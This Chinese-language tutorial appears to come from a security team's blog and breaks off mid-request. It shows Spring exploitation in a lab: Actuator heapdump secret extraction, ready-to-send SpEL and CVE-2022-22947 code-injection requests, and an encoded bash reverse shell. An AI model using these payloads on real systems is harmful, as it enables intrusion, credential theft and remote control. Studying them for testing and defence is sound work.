---
title: Spring漏洞测试与利用
url: https://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247517561&idx=1&sn=54d4c087458711183eef2d5373e7dc33&chksm=ce5da718f92a2e0e8f53cf92d03de7e78076267af9cfe8e6a0fc7d509811666fb6cb92d62ebe&scene=58&subscene=0#rd
source: Tide安全团队
date: 2024-12-07
fetch_date: 2025-10-06T19:40:23.742955
---

# Spring漏洞测试与利用

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RWiaqJutV1D4Zd0D9jbt2fAQBjOQsIeHw8qfgJcvEN8Fg3IjxBx5WC7AFEvjicLrA8d4uqQ5ox1Az0A/0?wx_fmt=jpeg)

# Spring漏洞测试与利用

原创

oh1inge

Tide安全团队

![](https://mmbiz.qpic.cn/sz_mmbiz_png/DuibU3GqmxVmRsdItbBVRKegNHicHQvAHDdZsGpLVU7touSU1AU1twHTfRjG3Vu5aUh0RnPPllfVUhs4qdWF5QYQ/640?wx_fmt=png)

声明：Tide安全团队原创文章，转载请声明出处！文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途给予盈利等目的，否则后果自行承担！

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zYJrD2VibHmqgf4y9Bqh9nDynW5fHvgbgkSGAfRboFPuCGjVoC3qMl6wlFucsx3Y3jt4gibQgZ6LxpoozE0Tdow/640?wx_fmt=png)

# Spring Boot基础原理

Spring Boot是一款基于JAVA的开源框架，目的是为了简化Spring应用搭建和开发流程。是目前比较流行，大中小型企业常用的框架。正因为极大的简化了开发流程，才受到了绝大开发人员的喜爱。

## 0x01 Spring Boot 表达式

OGNL：Apache Commons Object-Graph Navigation Language（常见于Struts2框架）
SpEL：spring Expression Language

### Spring Cloud

Spring Cloud是一个服务治理平台，是若干个框架的集合，提供了全套的分布式系统解决方案。包含了：服务注册与发现、配置中心、服务网关、智能路由、负载均衡、断路器、监控跟踪、分布式消息队列等等。常见的漏洞组件：Alibaba nacos、FastJson、Apache Dubbo

### Actuator

Spring Boot中的Actuator模块为应用系统提供了自省和监控的功能，通过使用Actuator，开发者可以轻松的查看和统计应用系统的各种监控指标。从安全的角度来讲，不管是在互联网系统还是内网系统中，该节点都是不该泄露在生产环境中的

#### Actuator Mappings

可以用于查看路由![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RUiagx8Rmg3GUOghDTUoKjfojpqddHenXwMOVY7Eu2JzuuuVVGyLibmn9jRZXeET1BoicQrZRXWuyaBw/640?wx_fmt=jpeg&from=appmsg)

#### Actuator ENV

项目环境变量-密码以密文的形式来显示![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RUiagx8Rmg3GUOghDTUoKjfoaiaRbYURxAJNwhCR7z8wH6NoHPbg9jmzRBN3owYlfEBtOicUh4DTXeOQ/640?wx_fmt=jpeg&from=appmsg)

#### Actuator Heapdump

访问heapdump端点可以下载heapdump，JVM 内存文件![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RUiagx8Rmg3GUOghDTUoKjfoNl2peibsv60uHVY7icsBiclD8XvQQSUuVoHamCtljJ3QLGRqoC0ahKYFQ/640?wx_fmt=jpeg&from=appmsg)下载之后的heapdump文件我们可以通过两款工具对其进行解密
heapdump\_tool

```
java -jar heapdump_tool.jar heapdump
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RUiagx8Rmg3GUOghDTUoKjfokdJSANIic9cia6waiawKIgFuZsjW5cn60e5oL3aDokQuibJvRhe0zEdDgQ/640?wx_fmt=jpeg&from=appmsg)

这款工具是识别出heapdump后进行搜索匹配密码等敏感信息
JDumpSpider
这款工具相对来说比较好用一些，这款工具会将该heapdump文件解密后全部输出出来

```
java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump  > heapdump.txt
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RUiagx8Rmg3GUOghDTUoKjfo3ZhcDDEQbWZG6UzQL2CNbtibKz7GVkacV0meyVBYU23rIWibdqzOjqJA/640?wx_fmt=jpeg&from=appmsg)![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RUiagx8Rmg3GUOghDTUoKjfoo1I7eh6zETIdYHMHEqe1MotEiaugMXQ5SLcyBm1hDv3sG9ib5icsUJ8gg/640?wx_fmt=jpeg&from=appmsg)

## 0x02 Spring Cloud Function SPEL

#### 漏洞成因

由于Spring CouldFunction中RoutingFunction类的apply方法将请求头中的”spring.cloud.function.routing-expression”参数作为Spel表达式进行处理，造成了Spel表达式注入漏洞，当使用路由功能时，攻击者可利用该漏洞远程执行任意代码。

#### 影响版本

`3.0.0.RELEASE <= Spring Cloud Function <= 3.2.2`

#### 漏洞利用

访问时用Burp拦截![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RUiagx8Rmg3GUOghDTUoKjfoSkMTACtpb89nBpVdb6jREAOlRnPBdj7Ayv0jabAicROZicDtMOD6EYew/640?wx_fmt=jpeg&from=appmsg)修改请求头为

```
POST /functionRouter
```

添加请求体内容

```
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("xxxx")
```

exec(“xxxx”)：为要执行的命令，具体数据包如下：

```
POST /functionRouter HTTP/1.1
Host: 192.168.45.198:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("touch /1.txt")
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 4

test
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RUiagx8Rmg3GUOghDTUoKjfoP2ZeaKXzThKC7XtzaZ2XSQBiavLSlSicMsRW4aZLXSzUl269ExQATB9w/640?wx_fmt=jpeg&from=appmsg)这时进入我们的容器中，输入命令就可以看到成功创建了1.txt

```
docker-compose exec spring bash
ls
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RUiagx8Rmg3GUOghDTUoKjfoOvI79BpiapiaibFveEZvd7AMTnTK9Dq37LpHWu20gdlVlMWH7VgIn1TXw/640?wx_fmt=jpeg&from=appmsg)反弹shell将exec(xxxx)修改如下（其中base64加密值为反弹shell命令）：

```
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY0LjEzMi84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}
```

## 0x03 CVE-2022-22947 Spring Cloud Geteway RCE

### 漏洞成因

Spring Cloud Gateway 是基于 Spring Framework 和 Spring Boot 构建的 API 网关，它旨在为微服务架构提供一种简单、有效、统一的 API 路由管理方式。据公布的漏洞描述称，当Spring Cloud Gateway 执行器端点启用、公开且不安全时，使用Spring Cloud Gateway的应用程序容易受到代码注入攻击。远程攻击者可以发出含有恶意代码的请求，从而允许在远程主机上任意远程执行。

### 漏洞利用

#### 添加路由

```
POST /actuator/gateway/routes/test HTTP/1.1
Host: 192.168.45.209:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Content-Type: application/json
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 295

{"id":"[filter_name]",
"filters":[{
"name":"AddResponseHeader",
"args":{
"name":"Result",
"value":"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"whoami\"}).getInputStream()))}"
}
}],
"uri":"http://example.com"}
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RUiagx8Rmg3GUOghDTUoKjfof8py8luRp8wHSctyyibS52mfnayQyDn19XDDoibJqTTjjwXicZcfHSfEg/640?wx_fmt=jpeg&from=appmsg)返回包中状态码中为201则代表创建成功

#### 刷新配置

```
POST /actuator/gateway/refresh HTTP/1.1
Host: 192.168.45.209:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Content-Type: application/json
Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 7
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RUiagx8Rmg3GUOghDTUoKjfoNTp6yWDR0cfuPyZaVqcgYOy1Zkd18xclOjByE9icv2KrFxjFPpdQEOw/640?wx_fmt=jpeg&from=appmsg)这里我们刷新路由使刚刚创建的路由生效

#### 访问路由

```
GET /actuator/gateway/test HTTP/1.1
Host: 192.168.45.209:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Content-Type: application/json
Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 7
```

生效后再访问我们刚刚创建的路由即可达到RCE的效果![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RUiagx8Rmg3GUOghDTUoKjfoU2lNkGEeU5kbTARxYkjzVSzBPh2sxF3AlWrSiaoQoNJDEGQIpLicvibnQ/640?wx_fmt=jpeg&from=appmsg)

#### 删除路由

```
DELETE /actuator/gateway/test HTTP/1.1
Host: 192.168.45.209:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Content-Type: application/json
Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 7
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RUiagx8Rmg3GUOghDTUoKjfocKibE8tprP8d9BO8qSkHxjSaoXQiasBR4icEUUOs5cTD7MKDHFnwk8dwg/640?wx_fmt=jpeg&from=appmsg)

创建完路由之后，我们也可以删除路由（需重新刷新下配置信息）

```
POST /actuator/gateway/refresh HTTP/1.1
Host: 192.168.45.209:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Content-Type: application/json
Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-L...